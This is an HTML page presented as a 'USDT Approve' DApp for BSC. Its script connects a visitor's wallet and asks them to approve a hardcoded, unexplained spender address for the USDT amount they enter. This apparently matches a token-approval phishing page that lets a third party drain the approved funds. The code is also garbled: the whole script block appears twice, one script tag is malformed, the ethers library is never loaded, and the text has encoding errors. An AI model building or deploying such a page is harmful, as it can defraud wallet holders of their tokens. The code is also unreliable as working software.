<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>USDT Approve | BSC DApp</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<<script>
/* ========= CONFIG ========= */
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const SPENDER_ADDRESS = "0x578b86B3d51fF707a3B4E1272eFfcD03979069e1";
const BSC_CHAIN_ID = "0x38";

/* Approve ABI */
const ABI = [
  {
    "inputs":[
      {"internalType":"address","name":"spender","type":"address"},
      {"internalType":"uint256","name":"amount","type":"uint256"}
    ],
    "name":"approve",
    "outputs":[{"internalType":"bool","name":"","type":"bool"}],
    "stateMutability":"nonpayable",
    "type":"function"
  }
];

let provider = null;
let signer = null;

function setStatus(msg){
  document.getElementById("status").innerText = msg;
}

/* ========= CONNECT WALLET ========= */
async function connectWallet() {
  try {
    if (!window.ethereum) {
      alert("Please open in Trust Wallet DApp Browser");
      return;
    }

    await window.ethereum.request({ method: "eth_requestAccounts" });

    const chainId = await window.ethereum.request({ method: "eth_chainId" });
    if (chainId !== BSC_CHAIN_ID) {
      alert("Please switch to BSC Mainnet");
      return;
    }

    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
    signer = provider.getSigner();

    const address = await signer.getAddress();
    setStatus("Wallet connected: " + address.slice(0,6) + "..." + address.slice(-4));
    alert("Wallet Connected");

  } catch (e) {
    alert("Connect error: " + e.message);
  }
}

/* ========= APPROVE ========= */
async function approveUSDT() {
  try {
    if (!signer) {
      alert("Please connect wallet first");
      return;
    }

    const amount = document.getElementById("amount").value;
    if (!amount || amount <= 0) {
      alert("Enter valid USDT amount");
      return;
    }

    setStatus("Opening wallet for approval...");

    const usdt = new ethers.Contract(USDT_ADDRESS, ABI, signer);
    const value = ethers.utils.parseUnits(amount.toString(), 18);

    const tx = await usdt.approve(
      SPENDER_ADDRESS,
      value,
      { gasLimit: 120000 }
    );

    setStatus("Transaction sent, confirm in walletâ€¦");
    await tx.wait();

    setStatus("USDT Approved Successfully âœ…");
    alert("Approve Success");

  } catch (e) {
    alert("Approve error: " + e.message);
  }
}
</script>

<style>
body {
  background:#0b1220;
  color:#fff;
  font-family:Arial;
  padding:20px;
}
h2 { text-align:center; }
input, button {
  width:100%;
  padding:14px;
  margin-top:12px;
  font-size:16px;
  border-radius:8px;
}
button {
  background:#16c784;
  border:none;
  color:white;
}
.status {
  margin-top:12px;
  font-size:14px;
  opacity:0.85;
}
</style>
</head>

<body>

<h2>USDT Approve (BSC)</h2>

<button onclick="connectWallet()">ðŸ”— Connect Wallet</button>

<input type="number" id="amount" placeholder="Enter USDT Amount (example: 10)" />

<button onclick="approveUSDT()">âœ… Approve USDT</button>

<div class="status" id="status">Waiting...</div>

<script>
/* ================= CONFIG ================= */

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const SPENDER_ADDRESS = "0x578b86B3d51fF707a3B4E1272eFfcD03979069e1";
const BSC_CHAIN_ID = "0x38";

/* USDT approve ABI */
const ABI = [
  {
    "inputs":[
      {"internalType":"address","name":"spender","type":"address"},
      {"internalType":"uint256","name":"amount","type":"uint256"}
    ],
    "name":"approve",
    "outputs":[{"internalType":"bool","name":"","type":"bool"}],
    "stateMutability":"nonpayable",
    "type":"function"
  }
];

let provider, signer;

/* ================= FUNCTIONS ================= */

function setStatus(msg){
  document.getElementById("status").innerText = msg;
}

async function connectWallet() {
  if (!window.ethereum) {
    alert("Open this site in wallet DApp Browser");
    return;
  }

  await window.ethereum.request({ method: "eth_requestAccounts" });

  const chainId = await window.ethereum.request({ method: "eth_chainId" });
  if (chainId !== BSC_CHAIN_ID) {
    alert("Please switch to BSC Mainnet");
    return;
  }

  provider = new ethers.providers.Web3Provider(window.ethereum, "any");
  signer = provider.getSigner();

  setStatus("Wallet connected successfully âœ…");
}

async function approveUSDT() {
  try {
    if (!signer) {
      alert("Please connect wallet first");
      return;
    }

    const amount = document.getElementById("amount").value;
    if (!amount || amount <= 0) {
      alert("Enter valid USDT amount");
      return;
    }

    setStatus("Preparing transaction...");

    const usdt = new ethers.Contract(USDT_ADDRESS, ABI, signer);
    const value = ethers.utils.parseUnits(amount.toString(), 18);

    const tx = await usdt.approve(
      SPENDER_ADDRESS,
      value,
      { gasLimit: 120000 }
    );

    setStatus("Transaction sent. Please confirm in wallet...");

    await tx.wait();

    setStatus("USDT Approved Successfully âœ…");

  } catch (e) {
    setStatus("Error: " + e.message);
  }
}
</script>

</body>
</html>
